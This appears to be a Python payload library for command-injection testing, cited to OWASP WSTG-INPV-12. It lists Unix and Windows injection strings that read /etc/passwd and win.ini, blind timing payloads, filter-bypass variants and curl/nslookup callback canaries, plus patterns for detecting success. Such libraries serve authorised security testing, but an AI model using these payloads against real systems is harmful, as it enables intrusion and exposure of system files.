"""Command Injection payload library (OWASP WSTG-INPV-12)."""

# Basic command injection (Unix)
UNIX_BASIC = [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "\nid\n",
    "; sleep 5",
    "| sleep 5",
]

# Windows command injection
WINDOWS_BASIC = [
    "& whoami",
    "| whoami",
    "|| whoami",
    "; whoami",
    "& type C:\\windows\\win.ini",
    "| type C:\\windows\\win.ini",
    "& ping -n 5 127.0.0.1",
]

# Time-based blind detection (cross-platform)
TIME_BLIND = [
    "; sleep 5",
    "| sleep 5",
    "& sleep 5",
    "&& sleep 5",
    "|| sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    "& ping -c 5 127.0.0.1",
    "& timeout /t 5",
]

# Filter bypass
FILTER_BYPASS = [
    ";{id}",
    ";\tid",
    ";$IFS'id'",
    ";${IFS}id",
    ";\tcat\t/etc/passwd",
    ";cat${IFS}/etc/passwd",
    ";cat$IFS/etc/passwd",
    "a]&&id||b",
    "$(printf '\\x69\\x64')",  # 'id' hex-encoded
]

# Out-of-band (OOB) detection canaries
OOB_CANARY_TEMPLATE = "; curl http://{CALLBACK}/{TOKEN}"
DNS_CANARY_TEMPLATE = "; nslookup {TOKEN}.{CALLBACK}"

ALL_PAYLOADS = UNIX_BASIC + WINDOWS_BASIC + TIME_BLIND + FILTER_BYPASS

# Detection patterns for command injection success
SUCCESS_PATTERNS = [
    "uid=",
    "gid=",
    "groups=",
    "root:x:0:0",
    "nt authority\\system",
    "windows_nt",
]
